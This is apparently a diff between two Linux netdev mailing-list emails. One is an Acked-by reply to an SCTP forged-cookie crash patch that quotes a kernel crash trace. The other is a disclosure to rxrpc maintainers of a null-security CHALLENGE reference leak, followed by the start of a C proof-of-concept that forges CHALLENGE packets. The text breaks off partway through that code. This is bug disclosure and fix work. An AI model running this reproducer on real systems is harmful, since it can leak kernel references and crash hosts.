@@ -1,101 +1,96 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.210.173
-ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
-	t=1792694805;
-	b=O26em1N6i9PRQoMI1qTnpNMfNTxCLkk/xPuJW9mL676fyPgyKm+MtJJ+v7eoqe/2GYWQ
-	 myHm1uSAR5fy62H7L8ICTDpbKcjWfR7OozUnE8ne+zid7HHcwhPJ8WSK0Dym3ADcgvsEF
-	 wGL/XT+pSHI6aST466dQ2UFPW81+ySppyXW0shnkCyoXW/XjYOhStN5ONfQztqGb0V5Xm
-	 DquzkF6tGygM/2DEtyz56X+aH3lNC6Y9whrF85iVU0eefCxqjtIPU6DXn/JSBWrzIQuRQ
-	 TTev2VqSyzL3WFcF+DkJ1WlmkK8LhgcCZEWnD5VLElIjPKjyxt9+mJpXdYivaq/RtJg==
-ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792694805;
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.171
+ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
+	t=1792694882;
+	b=4vp9q8DDPozUG+zddw9+D4IgLdTYioRRGDjCzkrwBV1Plo632aIxo1cMbdFmMWpxt+jF
+	 HptHP/EP5i/gfv/K2ZSuD7fc9vgFtiNcXbKyO5/Nt91zW70Xt4Nmk+1sLGBOfJRipqLvP
+	 vj5yijohqZxZZ2mp0YBysZeZcBvRwifbTi5KuRlz/XyLZFz+bPovG508PQhLP2CWyukMa
+	 UB+PApIiR50xh9BkT+3DBmdlv3Csrd+G6qETrEtrruAfnv1Px2FwDXeo6/pvOUI2fGlXf
+	 whgFaV9TvPvnPymBkvGOZI9wdpzWSJaaZTKEdip81KTePi3v4kdxVCMCK8bNwsyv7Jg==
+ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792694882;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
-	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
-	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
-	bh=VJ3fHdUL5SmQAXabxpkgaJOcxdg9wUPTydhIVNe9+f4=;
-	b=QEnFNfMcoSd5fIXyVKYiW6W5IfiKGeDzetK51OKk1Ym4eCtC4aogxwP0fy3zsYlKtStD
-	 sCWxqdvZmSCZJYvRldL5apPLvOOT0eciloxSHd/Ro5E9IGv2aX9bpIuw2IwEkxIaeKLW7
-	 pWPf4KYH3kPUUQN2b26VDtBlgHiN8a9Y5JIwOwEPXtxyhhP+tOJFEeXNUTrSBEBKmB3TA
-	 MjAma7EsbAXYVQNNYG3HzbIFBckUalyHPPZgE71whKQMoWhnbEfjZRj/5qAw0SPQ+B48U
-	 aO/ZKLSacaY52EJss7hGtAMEfyIgGk4eqI1RKfgM2LMfeU1Pb0w48tD2Ki+y/ee8zyA==
-ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=gmail.com;
-	spf=pass smtp.mailfrom=gmail.com;
-	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=eCUYLTzw;
-	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.210.173
-Received: from mail-pf1-f173.google.com (mail-pf1-f173.google.com [209.85.210.173])
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
+	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
+	 Content-Transfer-Encoding;
+	bh=DaVoAliTvYg5SjdSGV6RlSWbnhHTA9fRrUJhlLCgYlM=;
+	b=Pi9pStKZNd2q4QHlWDPckzxdLmhymyRlxHzJfIP3CI0qTUjVlnwhivrly02/ZoL1hlHa
+	 6iGfWDkTbxFwQ6K+5HcZ+9LKhYnxmUCD6zukoqE/z0B9BrO1mEjmPuwqbMqnPZEHokvUt
+	 rAdfUzXNRvQ/5KTjS2DbJqPTr6h3EQHrwpO++IQgXu5OOmhctjfVNVj67BEsb5n6Bn8x5
+	 37cAUprmCSRdo96ykRY7PKZ0C3HsD0l9QI406/Yr0WsRFCStOnJkDFP2RlKyCaP+bO+KX
+	 A3H+Urjx/Uqa7H5kHWpBpmdjLt6fwQ9RXaSoS2pqpynyabOCWyjq6fPVwRJ+lf70+Mw==
+ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=nebusec.ai;
+	spf=pass smtp.mailfrom=nebusec.ai;
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=WtH2Ssc+;
+	arc=none smtp.remote-ip=209.85.214.171
+Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 65CC6606A319
-	for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 18:46:45 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 65CC6606A319
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 168FE606A319
+	for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 18:48:01 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 168FE606A319
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=eCUYLTzw
-Received: by mail-pf1-f173.google.com with SMTP id d2e1a72fcca58-8a06c60065fso154700b3a.1
-        for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 11:46:45 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1792694805; cv=none;
-        d=google.com; s=arc-20260327;
-        b=SzID4RYjPPXL8U9+jPh32aeZhBRVS1FYDT54+nfXE6tDsOhFQf+rUnQbiLS9IwDIjy
-         qdlM2ymA2scHMdXagHj+ywjL3bHcfsSqQvVqRfjnaOokMzw+/9iqKIevjYq+r7ql3AbF
-         jf2UaqPomsdWCA8HGqyP/aJfvnhCN/RfmNBvHZL0I/l4JwlAxsr1KhU4TaVW9yIfuqHZ
-         Z+Q8i4Bv72Sd9ofx7+p/+l63ZkPNKfzBfla/I/m9SP0FHWcsHAVr5UGpv6HkO2CxzEJY
-         9+aeXnLKU1VuKpe7jolqcJHX9VKGHytHrIMEP8FtRQQt0vNEEz1zoT2TnVfFQhjnuJfI
-         yPow==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=VJ3fHdUL5SmQAXabxpkgaJOcxdg9wUPTydhIVNe9+f4=;
-        fh=EAEdreS9u4Q/+427YsCA/E+CbT8IoT5z4TC01r2vpg8=;
-        b=JDrzACzXBPvGRAWeIYZufIorW/COhuZFicekYXiOLyLZ96VT6iqrVhTIzMmP5JYwmZ
-         lKE9uq0uKpLOp/qJQ6EczAOpwUYaAs7eH5k5hxxCAleR61MgbL8H2qU5u1xpEjBDgsps
-         tUSI+ciE6WOEtf3FBcH5Q5MyfTaS8HoNGIOnKwHi1b3aNoevT9nmugo8xUtW6VMWkE4v
-         g+OLBjAznjk8Tc7mYBPVq/Z+Yn35pJbIbCUnnEvmLZMAzC6OEbufUQbUu/6IjPB/AKBx
-         Co8xoRqVfMwSyJSxvfdHPtiI0vRdywGJVbCDxyZoADYMXfgFgqdeSndXgVCg5JoL9UoS
-         MATA==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=WtH2Ssc+
+Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2e977109392so414955ad.0
+        for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 11:48:01 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1792694805; x=1793299605; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=VJ3fHdUL5SmQAXabxpkgaJOcxdg9wUPTydhIVNe9+f4=;
-        b=eCUYLTzwJZfnxmvJY9lif6asT9vcmB2mq2KLsm86LPWGVoZxPtjKpSerjQHYcsIj4D
-         egiAzCIIJObZgpd+Fnb/+IzuoC43KA53Onhu2BPNR8wXUQSNWmxQxU8J4demSlU4Jyvy
-         Rk+qcJh6IfWE5OLhY8ZZvXS1tXDSz3IvgXCBf2wwB6+/ZXUVp+P26GASmU5c+X4/jnig
-         SPJbKfm4LqSDhKuzVRvqs5qsR9LPgJrgYOa0sODJKY3QyAw33Jy4gDcNtFKRSk6Xz9gV
-         Srk07x5b+lqGu/n0bH9Fywbd7BiKbTwKfU6aWAlya8HEHokfXZngpHgeZ61W3KK9yLmm
-         Z6LQ==
+        d=nebusec.ai; s=google; t=1792694881; x=1793299681; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=DaVoAliTvYg5SjdSGV6RlSWbnhHTA9fRrUJhlLCgYlM=;
+        b=WtH2Ssc+NtyGPpVN9cDF1ORAjGDASXkx8a57/Wops0S6PiTzgKSgsFNKxe5j4tnHzc
+         ZbEMsLA3QTh4EUftoF8dyPSOVlpZufpqmxZ3k8NKiC00Cs69J/E8J8eKT2r0KQ+qq+5T
+         DVwR0cj/iDOdFGTCkspmnXrkSiNbWVQwsdPDUzUozUk8ny+mZs149SBUMAPpJgUkkoIl
+         ujdmy1yLfRsK9PYy5hLtZmIBabOKJI6y+IG19it1kGJwICpW6x6pA7fIj5CpAoNkuNre
+         1hY8ZYvqx633bP7EBcVvd+dBoNCe3tamXlvAgOa6FsdPmK5RXiLeEdgfjyewtgLOBn9t
+         2SAw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1792694805; x=1793299605;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=VJ3fHdUL5SmQAXabxpkgaJOcxdg9wUPTydhIVNe9+f4=;
-        b=U7rkWZP+x9kyVbf18XvGbLQ7yva/JaOa1/hz2pDXtmBtFbiDywnkpLP2z5SfKot1Ub
-         Adi0XvcjIBHEU10kmUgQFlYsOeFbwlAlJ6yYv5bcz5N65rFYe1Igz2koH6n9W88gGJ0r
-         g55UzFe6DOtlzpi0INqCL4K3XYkZPPMyAoTqDsoRJVGFhHJrfr1ax3cVvvn3ysTGCpzD
-         tQ+rltcbkKjDaTf7JxiVqj72OfmvzB9iOy8+1A4ZJZv0FzDbL2Sv45kBp7mk78j/6opa
-         wohSi+viJMTB5q7aUkwsNO9zC/OQaoVaX7HMJrUmP/Vqrdjj0GbLVXtzuQdLtXFz+jFP
-         sIeg==
-X-Forwarded-Encrypted: i=1; AKwUvBzVFOTkLHfNXG/lTv/VNDCidl2XiqyWsjfd0CVS4/HqoldPzaCfdit+SIKgrwvoFj392edV2+4=@vger.kernel.org
-X-Gm-Message-State: AFq9FYKjxycd2yUib0qwvgPZw++bY1LcbX+M1QoFFY575xQ9321OODrH
-	iUThXQLvvyi1bohdhYX9k9OBwfZhMzOuOXr5x+xMEKjDQl8ECTiH0DEcYMrPamWRalOSBc0JnLG
-	EoUzkVTieCvbV6FDpmkfnQtjPUVONZo0=
-X-Gm-Gg: AYBFou1QetO8BDW/biVPSU/LWW3LrjhFHCtKDMSfT/33hw5WHFkOq5ASOjwlQQvD33w
-	8r62/eiF6GCXdWarUDEHO9+y/zyQUqnVN6zi92NFIf8kzPZh7pWnF4rZPQRJW4hoe2VNzsIt1gn
-	dI56ijaRzfxNEvFqb95qACmErhYHWHxUvVhdqvyzXPmkNWcwfKd+xuNOE9YipwB3Ae4xKoCZsPU
-	rXJDgfUKF1Ck+JdSgDy93eXIwI2AgMKGtGoD2wY1ZFtHB+zmbV7jWF9dKut4TRAMg59hr01IZwy
-	DDjtpUOevD6xLqMjjbAw4abe47RuJMrqILwySf9Bu8Ag7FUvYsbPoLo4t4rVyCcGQhiFHONxQBd
-	0zHLk6WkJQ5G9P/GLLat2+9LAJ/7U26lXD479IWFZoD0Y9XKtlBbeoEm3l5ing5Zif/SxBmRuMC
-	5VrPlRlHqbc0gMqsJNkIx2nrPg1YUapUQziME=
-X-Received: by 2002:a05:6a00:428f:b0:8a0:70ff:aaf0 with SMTP id
- d2e1a72fcca58-8a2c7656184mr31128b3a.49.1792694804726; Thu, 22 Oct 2026
- 11:46:44 -0700 (PDT)
+        d=1e100.net; s=20260707; t=1792694881; x=1793299681;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=DaVoAliTvYg5SjdSGV6RlSWbnhHTA9fRrUJhlLCgYlM=;
+        b=jCMFZY3rCu87w9WU0k7CYryr5XYLvjJP4LXYVZ98Ny1VKBSm8WehEJbrgQWVnIvc98
+         /7sbsRvAfHFfaFqiJ8Ia2mYeEU9UPDkwbLXOeet+l6rc9EMNWaEQKUo38jfyIHj3PoJC
+         /GW5ztNFR+IHAATLzWbZL2jaM7knPSOxpuMVOluN+TqHbDL5wjP1t9SNXQhsrqosKuIY
+         TKmzvpdQpiKY6j8ChdTSgK7u9Vegp+MVJ/SmfNSCtl3TkL3LHnO40J7dvs7Bri+qtODA
+         UrtU6ImPIuSGo3/2B6Bt3vIK5aU8g7bLnobc8rV2GS0L4qW2PR4K0PRgiu9MtcLcVLaV
+         MLow==
+X-Forwarded-Encrypted: i=1; AKwUvBzUygbfLWd3ajvF5gq37DB48SgvU6RScbUPC5ChQm95JXO5s2HuEhZuXzbDbVLEEe1iaBjKsUw=@vger.kernel.org
+X-Gm-Message-State: AFq9FYKIAqXxhvxEWGbJciIcIvR+VNZIKFJL4Qn9rd38OihAHLTWNtkg
+	Dv7zlrKCjcGJKVx4450C8h3Ymhkw45Jp9GTaXEDFKaa1CkOPz9FHXnC1QJm4Oj05zDIe
+X-Gm-Gg: AYBFou2VELLhJ/3QS9ybnJQqNoWSh0rwscVCREFPebH0sNeJxDAYxNCBbBvmb2flZXb
+	RbleiV8DqOkEBs9WbCMlDHwixo9ZLt+2WoNlXaBbSIEA4uLzKEp1dMRF2P1NVnIwMu+0pC13UjL
+	YlEPCJ4IAKf+vSxCW0Yyv2sK69BXmyP5waDy31JKkF+odI8kWjFZMeLF0WN32csHx0DRfghiboM
+	iRNOmaVNFKSHkBYfKyBbtPIavTx0sKqKaJgziCThaHTMiOmLuSS868Np8Uh0gydFbxeSVZZ+mLe
+	j/tJOs0EWjMH+Jz0tH5pxLFG/vutDFDexP5HXjVPo7S0/6uitRJ6a7NR3pWMbyMmmZN/bbVQLBy
+	gZgCDeSIP+c423Jv4u3ycad3MJULvvMlicMfpDttDNVijPeKNu8J15c4KEw3BnsgEulBizo7qjJ
+	Ns9H4cvuO+T4DpN1wBL1qhP38BmVpPAt4GIwQE5ZEDPTmgnUf1EqiUVHj5qUkr7N2Mj2pbcfWhI
+	CKH7Hn5/B4CeUSAn+nJSmGJK91gl0p4H9YqbIOlMLrQlp3wWL0hu+L+iiGb+vp/khhU
+X-Received: by 2002:a17:902:d4cd:b0:2e6:679:9e4 with SMTP id d9443c01a7336-2ea7cf5ac6amr1129955ad.60.1792694881050;
+        Thu, 22 Oct 2026 11:48:01 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([2001:49f0:d0db:ffab:2834:5ac2:f726:a005])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ea7b3b01a6sm2052405ad.44.2026.10.22.11.47.56
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 22 Oct 2026 11:48:00 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: linux-afs@lists.infradead.org,
+	netdev@vger.kernel.org
+Cc: dhowells@redhat.com,
+	marc.dionne@auristor.com,
+	davem@davemloft.net,
+	edumazet@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH net 0/1] rxrpc: fix null-security challenge leak
+Date: Fri, 23 Oct 2026 02:47:45 +0800
+Message-ID: <cover.1792694708.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.55.0
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -105,73 +100,448 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:netdev+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-References: <20261019073747.178626-1-hdthky0@gmail.com>
-In-Reply-To: <20261019073747.178626-1-hdthky0@gmail.com>
-From: Xin Long <lucien.xin@gmail.com>
-Date: Thu, 22 Oct 2026 14:46:33 -0400
-X-Gm-Features: AclHuK-PDx0jP5an3A6M6WQQwIMwVAosfNCvGR5QppU0ezO-BznZ8wHlN5NdZ1U
-Message-ID: <CADvbK_ft9t1ipGawiOGsKU+qf0PFhctvewV6v+P0XmSMZOyA3Q@mail.gmail.com>
-Subject: Re: [PATCH v5] sctp: reject forged cookie peer_addr with unknown
- address family
-To: Xingyuan Mo <hdthky0@gmail.com>
-Cc: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>, "David S. Miller" <davem@davemloft.net>, 
-	Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
-	Simon Horman <horms@kernel.org>, "open list:SCTP PROTOCOL" <linux-sctp@vger.kernel.org>, 
-	"open list:NETWORKING [GENERAL]" <netdev@vger.kernel.org>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
-On Mon, Oct 19, 2026 at 3:38=E2=80=AFAM Xingyuan Mo <hdthky0@gmail.com> wro=
-te:
->
-> When cookie authentication is disabled, COOKIE-ECHO peer_addr is
-> attacker-controlled. An invalid sa_family made sctp_get_af_specific()
-> return NULL and crash in sctp_transport_init() on
-> af_specific->sockaddr_len. Validate it with af->addr_valid() in
-> sctp_unpack_cookie(), which also rejects a mismatched family, e.g.
-> an AF_INET6 peer_addr on an IPv4 socket that would later crash in
-> sctp_v6_get_dst() on inet6_sk(sk)->opt. Validate a copy of peer_addr,
-> since addr_valid() rewrites a v4-mapped v6 address in place and the
-> cookie still lives in the received skb, which is not guaranteed to
-> be unshared. Store the validated copy in the new association and
-> pass it to sctp_process_init() instead of the raw cookie, so a
-> v4-mapped v6 address is normalised to AF_INET before the association
-> and its primary transport are built from it.
->
-> For that, sctp_v6_addr_valid() has to return 0 for a non-v4-mapped
-> address when it is called with a socket that is not PF_INET6, so that
-> IPv6 addresses are never used on IPv4 sockets. The check is done after
-> the v4-mapped handling, so v4-mapped addresses passed to an IPv4
-> socket through the socket API keep being accepted. As addr_valid()
-> now also checks sk_family and ipv6_only_sock, simplify the address
-> handling in sctp_process_param() with it, as it additionally filters
-> out non-unicast addresses. As a side effect, a v4-mapped address in
-> an IPv6 address parameter is now normalised to AF_INET before the
-> transport is created, matching what the socket API paths already do.
->
-> Also add the missing !af check in sctp_process_init(), as
-> sctp_get_af_specific(AF_INET6) returns NULL on CONFIG_IPV6=3Dn builds.
->
->   BUG: KASAN: null-ptr-deref in sctp_transport_new+0xa7/0x350
->   Read of size 4 at addr 00000000000000b4 by task poc/682
->   Call Trace:
->    <IRQ>
->    sctp_transport_new+0xa7/0x350
->    sctp_assoc_add_peer+0x153/0x850
->    sctp_process_init+0xf9/0x1180
->    sctp_sf_do_5_1D_ce+0x464/0xbc0
->    sctp_do_sm+0x114/0x2990
->    sctp_endpoint_bh_rcv+0x280/0x430
->    sctp_inq_push+0xdd/0x100
->    sctp_rcv+0x17f5/0x1ae0
->    sctp4_rcv+0x2b/0x40
->    ip_protocol_deliver_rcu+0x25b/0x270
->    ip_local_deliver+0xd1/0xe0
->    </IRQ>
->   Kernel panic - not syncing: Fatal exception in interrupt
->
-> Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
-> Assisted-by: opencode:deepseek-v4
-> Signed-off-by: Xingyuan Mo <hdthky0@gmail.com>
+Hi Linux kernel maintainers,
 
-Acked-by: Xin Long <lucien.xin@gmail.com>
+We found and validated a reference leak in net/rxrpc/insecure.c. A
+CHALLENGE packet received by a null-security RxRPC client connection
+causes the connection to be aborted, but the packet is still queued
+for connection processing. A userspace RxRPC client can exercise this
+path without elevated privileges.
+
+We will provide details of the bug below, along with a PoC and the
+QEMU crash log.
+
+---- details below ----
+
+Bug details:
+
+none_validate_challenge() aborts a null-security connection after
+receiving a CHALLENGE, but returns true. rxrpc_input_conn_packet()
+interprets true as permission to continue and calls
+rxrpc_post_challenge(). That function takes a reference to the
+connection and queues the CHALLENGE for its worker.
+
+The connection is already aborted when rxrpc_process_event() handles
+the queued packet. It returns early with -ECONNABORTED, before clearing
+sp->chall.conn and dropping the rxrpc_conn_get_challenge_input
+reference. The leaked connection retains references to its peer and
+local endpoint. Repeating this for distinct connections leaks additional
+references; tearing down the affected network namespace then triggers
+the rxrpc_destroy_all_connections() BUG_ON.
+
+Return false after aborting the connection so the input path rejects
+the CHALLENGE instead of queueing it and taking the extra reference.
+
+Reproducer:
+
+    make
+    ./poc --newnet-before
+
+Run the namespace-teardown reproducer as root in a disposable QEMU
+guest. The reference leak itself is also observable as an unprivileged
+user by running ./poc and checking /proc/net/rxrpc/conns.
+
+The crash was reproduced on Linux 7.1.0-rc1 with AF_RXRPC, RXKAD,
+KEYS, USER_NS, NET_NS, and KASAN enabled.
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/keyctl.h>
+#include <linux/rxrpc.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/poll.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sched.h>
+#include <unistd.h>
+
+#ifndef SOL_RXRPC
+#define SOL_RXRPC 272
+#endif
+
+#define RXRPC_CLIENT_INITIATED 0x01
+#define RXRPC_LAST_PACKET 0x04
+#define RXRPC_PACKET_TYPE_DATA 1
+#define RXRPC_PACKET_TYPE_CHALLENGE 6
+
+typedef int32_t key_serial_t;
+
+struct rxrpc_wire_header {
+	uint32_t epoch;
+	uint32_t cid;
+	uint32_t callNumber;
+	uint32_t seq;
+	uint32_t serial;
+	uint8_t type;
+	uint8_t flags;
+	uint8_t userStatus;
+	uint8_t securityIndex;
+	uint16_t reserved;
+	uint16_t serviceId;
+} __attribute__((packed));
+
+struct shared_state {
+	int rxrpc_fd;
+	struct sockaddr_rxrpc srx;
+	volatile int ready;
+	volatile int send_started;
+	volatile int send_done;
+	int send_ret;
+	int send_errno;
+};
+
+static void die(const char *what)
+{
+	perror(what);
+	exit(1);
+}
+
+static long xadd_key(const char *type, const char *desc,
+		     const void *payload, size_t plen, key_serial_t ringid)
+{
+	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
+}
+
+static void install_null_key(void)
+{
+	key_serial_t keyring;
+	key_serial_t key;
+
+	keyring = xadd_key("keyring", "rxrpc_test", NULL, 0, KEY_SPEC_PROCESS_KEYRING);
+	if (keyring < 0)
+		die("add_key(keyring)");
+
+	key = xadd_key("rxrpc", "poc-null", NULL, 0, keyring);
+	if (key < 0)
+		die("add_key(rxrpc null)");
+}
+
+static void bring_loopback_up(void)
+{
+	int fd;
+	struct ifreq ifr;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die("socket(ifreq)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
+	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
+		die("ioctl(SIOCGIFFLAGS)");
+	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
+	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
+		die("ioctl(SIOCSIFFLAGS)");
+	close(fd);
+}
+
+static int setup_server_udp(uint16_t *port_out)
+{
+	int fd;
+	struct sockaddr_in addr;
+	socklen_t len = sizeof(addr);
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die("socket(server udp)");
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+	addr.sin_port = htons(0);
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die("bind(server udp)");
+
+	if (getsockname(fd, (struct sockaddr *)&addr, &len) < 0)
+		die("getsockname(server udp)");
+
+	*port_out = ntohs(addr.sin_port);
+	return fd;
+}
+
+static int setup_rxrpc_client(uint16_t server_port, struct sockaddr_rxrpc *srx)
+{
+	int fd;
+	unsigned int min_sec = RXRPC_SECURITY_PLAIN;
+	char key_desc[] = "poc-null";
+
+	fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+	if (fd < 0)
+		die("socket(AF_RXRPC)");
+
+	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY, key_desc, strlen(key_desc)) < 0)
+		die("setsockopt(RXRPC_SECURITY_KEY)");
+
+	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &min_sec, sizeof(min_sec)) < 0)
+		die("setsockopt(RXRPC_MIN_SECURITY_LEVEL)");
+
+	memset(srx, 0, sizeof(*srx));
+	srx->srx_family = AF_RXRPC;
+	srx->srx_service = 1;
+	srx->transport_type = SOCK_DGRAM;
+	srx->transport_len = sizeof(struct sockaddr_in);
+	srx->transport.sin.sin_family = AF_INET;
+	srx->transport.sin.sin_port = htons(server_port);
+	srx->transport.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+	return fd;
+}
+
+static void *sender_thread(void *arg_)
+{
+	struct shared_state *st = arg_;
+	char byte = 'A';
+	char cbuf[CMSG_SPACE(sizeof(uint64_t))];
+	struct cmsghdr *cmsg;
+	struct iovec iov = {
+		.iov_base = &byte,
+		.iov_len = sizeof(byte),
+	};
+	struct msghdr msg = {
+		.msg_name = &st->srx,
+		.msg_namelen = sizeof(st->srx),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = cbuf,
+		.msg_controllen = sizeof(cbuf),
+	};
+	uint64_t call_id = 0x4141414141414141ULL;
+
+	memset(cbuf, 0, sizeof(cbuf));
+	cmsg = CMSG_FIRSTHDR(&msg);
+	cmsg->cmsg_level = SOL_RXRPC;
+	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
+	cmsg->cmsg_len = CMSG_LEN(sizeof(call_id));
+	memcpy(CMSG_DATA(cmsg), &call_id, sizeof(call_id));
+
+	while (!st->ready)
+		usleep(1000);
+
+	st->send_started = 1;
+	st->send_ret = sendmsg(st->rxrpc_fd, &msg, 0);
+	st->send_errno = errno;
+	st->send_done = 1;
+	return NULL;
+}
+
+static void recv_data_packet(int server_fd, struct rxrpc_wire_header *hdr,
+			     struct sockaddr_in *src, char *payload, size_t payload_len)
+{
+	char buf[512];
+	socklen_t slen = sizeof(*src);
+	ssize_t n;
+	size_t copy_len;
+
+	n = recvfrom(server_fd, buf, sizeof(buf), 0, (struct sockaddr *)src, &slen);
+	if (n < (ssize_t)sizeof(*hdr)) {
+		fprintf(stderr, "short recv %zd\n", n);
+		exit(1);
+	}
+
+	memcpy(hdr, buf, sizeof(*hdr));
+	hdr->epoch = ntohl(hdr->epoch);
+	hdr->cid = ntohl(hdr->cid);
+	hdr->callNumber = ntohl(hdr->callNumber);
+	hdr->seq = ntohl(hdr->seq);
+	hdr->serial = ntohl(hdr->serial);
+	hdr->serviceId = ntohs(hdr->serviceId);
+
+	copy_len = (size_t)n - sizeof(*hdr);
+	if (copy_len > payload_len - 1)
+		copy_len = payload_len - 1;
+	memcpy(payload, buf + sizeof(*hdr), copy_len);
+	payload[copy_len] = '\0';
+}
+
+static void send_forged_challenge(int server_fd,
+				  const struct rxrpc_wire_header *observed,
+				  const struct sockaddr_in *dst)
+{
